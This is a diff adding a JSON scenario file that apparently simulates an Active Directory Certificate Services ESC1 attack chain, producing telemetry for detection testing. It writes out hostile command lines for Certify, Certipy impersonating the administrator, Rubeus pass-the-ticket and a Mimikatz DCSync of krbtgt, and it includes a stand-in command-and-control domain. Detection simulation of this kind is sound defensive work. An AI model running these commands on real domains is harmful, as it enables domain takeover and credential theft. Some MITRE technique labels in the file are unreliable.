@@ -1,0 +1,209 @@
+[
+  {
+    "name": "Stage 1 - Certificate Template Enumeration",
+    "delay": 0.2,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "certify.exe",
+        "FolderPath": "C:\\Users\\{{RANDOM_USER}}\\AppData\\Local\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "certify.exe find /vulnerable /ca:DC-CORP-01.litware.com\\litware-CA",
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "DC-CORP-01",
+        "integrity_level": "Medium",
+        "token_elevation": "TokenElevationTypeLimited",
+        "parent_process_name": "powershell.exe",
+        "mitre": {
+          "tactic": "Discovery",
+          "technique_id": "T1520",
+          "technique_name": "Security Software Discovery: Certificate Services Enumeration"
+        },
+        "is_malicious": true,
+        "killchain_phase": "discovery"
+      },
+      {
+        "source": "endpoint_network",
+        "event_type": "network_connection",
+        "DeviceAction": "allowed",
+        "Protocol": "TCP",
+        "SourcePort": "{{RANDOM_PORT}}",
+        "DestinationPort": 445,
+        "DestinationIP": "{{RANDOM_IP}}",
+        "DeviceName": "DC-CORP-01",
+        "AccountName": "{{RANDOM_USER}}",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Discovery",
+          "technique_id": "T1520",
+          "technique_name": "Security Software Discovery: Certificate Services Enumeration"
+        },
+        "killchain_phase": "discovery"
+      }
+    ]
+  },
+  {
+    "name": "Stage 2 - ESC1: Certificate Request with Subject Alternative Name (SAN)",
+    "delay": 1.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "certipy.exe",
+        "FolderPath": "C:\\Users\\{{RANDOM_USER}}\\AppData\\Local\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "certipy.exe req -ca litware-CA -template SubCA -ca-server DC-CORP-01.litware.com -upn administrator@litware.com -dns DC-CORP-01.litware.com -target {{RANDOM_IP}}",
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "DC-CORP-01",
+        "parent_process_name": "cmd.exe",
+        "mitre": {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1649",
+          "technique_name": "Steal or Forge Authentication Certificates: ADCS Abuse (ESC1)"
+        },
+        "is_malicious": true,
+        "killchain_phase": "privilege-escalation"
+      },
+      {
+        "source": "endpoint_network",
+        "event_type": "network_connection",
+        "DeviceAction": "allowed",
+        "Protocol": "TCP",
+        "SourcePort": "{{RANDOM_PORT}}",
+        "DestinationPort": 443,
+        "DestinationIP": "{{RANDOM_IP}}",
+        "DeviceName": "DC-CORP-01",
+        "AccountName": "{{RANDOM_USER}}",
+        "data": {
+          "EnrollmentEndpoint": "https://DC-CORP-01.litware.com/certsrv/",
+          "ProtocolDetail": "Certificate Enrollment Web Service (CES)"
+        },
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1649",
+          "technique_name": "Steal or Forge Authentication Certificates: ADCS Abuse (ESC1)"
+        },
+        "killchain_phase": "privilege-escalation"
+      }
+    ]
+  },
+  {
+    "name": "Stage 3 - Authentication with Forged Certificate (PKINIT)",
+    "delay": 1.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "Rubeus.exe",
+        "FolderPath": "C:\\Users\\{{RANDOM_USER}}\\AppData\\Local\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "Rubeus.exe asktgt /user:administrator /certificate:C:\\Users\\{{RANDOM_USER}}\\AppData\\Local\\Temp\\cert.pfx /password:[REDACTED] /domain:litware.com /dc:DC-CORP-01.litware.com /ptt",
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "DC-CORP-01",
+        "parent_process_name": "certipy.exe",
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1649",
+          "technique_name": "Steal or Forge Authentication Certificates: PKINIT Abuse"
+        },
+        "is_malicious": true,
+        "killchain_phase": "credential-access"
+      },
+      {
+        "source": "identity_logon",
+        "event_type": "identity_logon",
+        "logon_type": "Interactive",
+        "protocol": "Kerberos (PKINIT)",
+        "logon_result": "Success",
+        "is_admin_logon": true,
+        "is_service_account": false,
+        "account_domain": "litware.com",
+        "AccountName": "Administrator",
+        "IPAddress": "{{RANDOM_IP}}",
+        "DeviceName": "DC-CORP-01",
+        "TargetDevice": "DC-CORP-01",
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1649",
+          "technique_name": "Steal or Forge Authentication Certificates: PKINIT Abuse"
+        },
+        "is_malicious": true,
+        "killchain_phase": "credential-access"
+      }
+    ]
+  },
+  {
+    "name": "Stage 4 - DCSync via Certificate-Based Domain Admin",
+    "delay": 2.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "mimikatz.exe",
+        "FolderPath": "C:\\Users\\Administrator\\AppData\\Local\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "mimikatz.exe \"lsadump::dcsync /domain:litware.com /user:krbtgt\" exit",
+        "AccountName": "Administrator",
+        "DeviceName": "DC-CORP-01",
+        "parent_process_name": "cmd.exe",
+        "integrity_level": "High",
+        "token_elevation": "TokenElevationTypeFull",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1003.006",
+          "technique_name": "OS Credential Dumping: DCSync"
+        },
+        "killchain_phase": "credential-access"
+      },
+      {
+        "source": "dns",
+        "event_type": "dns_query",
+        "Name": "evil-cnc.net",
+        "QueryType": "A",
+        "ResultCode": "0",
+        "IPAddresses": "{{CNC_IP}}",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Command and Control",
+          "technique_id": "T1071.001",
+          "technique_name": "Application Layer Protocol: Web Protocols"
+        },
+        "killchain_phase": "command-and-control"
+      }
+    ]
+  },
+  {
+    "name": "Stage 5 - Detection: ADCS Abuse & Certificate Auth Anomaly",
+    "delay": 0.5,
+    "events": [
+      {
+        "source": "security_alert",
+        "event_type": "security_alert",
+        "alert_name": "ADCS Abuse - Suspicious Certificate Enrollment & ESC1 Exploitation",
+        "alert_type": "PrivilegeEscalation",
+        "severity": "Critical",
+        "description": "Certificate request for SubCA template with Subject Alternative Name mismatch detected on DC-CORP-01. Requester={{RANDOM_USER}} but SAN specifies administrator@litware.com. Event correlation: Certify enumeration -> Certipy ESC1 exploit -> Rubeus PKINIT auth as Domain Admin -> DCSync on krbtgt account. Full ADCS abuse killchain observed with tool signatures (Certify, Certipy, Rubeus, Mimikatz).",
+        "confidence_level": "High",
+        "confidence_score": 0.96,
+        "tactics": "['Discovery', 'Privilege Escalation', 'Credential Access']",
+        "techniques": "['T1520', 'T1649', 'T1003.006']",
+        "compromised_entity": "DC-CORP-01.litware.com",
+        "remediation_steps": "Revoke malicious certificates issued to SubCA template, disable vulnerable certificate templates, review CA security descriptor, force KRBTGT password reset twice, rebuild domain if Golden Ticket suspected",
+        "mitre": {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1649",
+          "technique_name": "Steal or Forge Authentication Certificates: ADCS Abuse"
+        },
+        "is_malicious": true,
+        "killchain_phase": "privilege-escalation"
+      }
+    ]
+  }
+]
